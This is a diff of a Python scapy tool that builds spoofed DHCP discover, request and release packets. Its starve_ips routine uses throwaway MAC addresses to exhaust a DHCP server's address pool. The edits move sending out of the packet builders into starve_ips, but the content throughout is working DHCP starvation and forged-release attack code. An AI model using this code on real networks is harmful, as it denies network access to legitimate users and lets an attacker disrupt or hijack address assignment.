@@ -83,9 +83,9 @@ def mac_to_binary(regular_mac : str):
     return result
 
 
-def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, transaction_id : hex, interface : str = conf.iface):
+def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, transaction_id : hex):
     """
-    sends a DHCP release with the source and dest being the args through the arg interface
+    returns a DHCP release with the source and dest being the args
     """
     function_name = inspect.currentframe().f_code.co_name
 
@@ -99,13 +99,13 @@ def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, tr
                     / BOOTP(htype = BOOTP_ATTS.HTYPE.ETHERNET, op = BOOTP_ATTS.OP_CODE.BOOTREQUEST, chaddr=mac_to_binary(src_mac), xid = transaction_id, ciaddr = ip)\
                     / DHCP(options=dhcp_options)
     
-    logger.info(f"{function_name} : sending dhcp release from {ip},{src_mac} to {server_ip},{server_mac} via {interface}")
+    logger.debug(f"{function_name} : {dhcp_release_packet.summary()}")
         
-    sendp(dhcp_release_packet, iface=interface)
+    return dhcp_release_packet
 
-def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : str, interface : str = conf.iface):
+def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : str):
     """
-    sends a DHCP request with the source being the args through the arg interface
+    returns a DHCP request with the source being the args
     """
     function_name = inspect.currentframe().f_code.co_name
     dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', ip),('server_id', server_ip),('end')]
@@ -116,12 +116,12 @@ def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : 
                     / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
                     / BOOTP(htype = BOOTP_ATTS.HTYPE.ETHERNET, op = BOOTP_ATTS.OP_CODE.BOOTREQUEST, chaddr=mac_to_binary(device_mac), xid = transaction_id)\
                     / DHCP(options=dhcp_options)
-    logger.info(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
-    sendp(request_packet, iface=interface)
+    logger.debug(f"{function_name} :  {request_packet.summary()}")
+    return request_packet
 
-def dhcp_discover(src_mac : str, interface : str = conf.iface):
+def dhcp_discover(src_mac : str):
     """
-    sends a DHCP discover with the source being the args through the arg interface
+    returns a DHCP discover with the source being the arg
     """
     
     dhcp_options = [('message-type', 'discover'), ('client_id', src_mac), ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),('end')]
@@ -130,7 +130,7 @@ def dhcp_discover(src_mac : str, interface : str = conf.iface):
                         / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
                         / BOOTP(htype = BOOTP_ATTS.HTYPE.ETHERNET, op = BOOTP_ATTS.OP_CODE.BOOTREQUEST ,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0', flags = BOOTP_ATTS.FLAGS.BROADCAST)\
                         / DHCP(options=dhcp_options)
-    sendp(discover_packet, iface=interface)   
+    return discover_packet
 
 def is_bootp(packet)->bool:
     """
@@ -314,7 +314,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         sniff_thread.start()
         
         time.sleep(0.2)
-        dhcp_discover(temp_mac, interface)
+        sendp(dhcp_discover(temp_mac), interface)
         
         sniff_thread.join()
         
@@ -332,7 +332,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         #TODO start a thread that sniffs for ACK or NAK
 
-        dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip, interface)
+        sendp(dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip), interface)
         
         #TODO stop the thread and check if we got ACKed
 
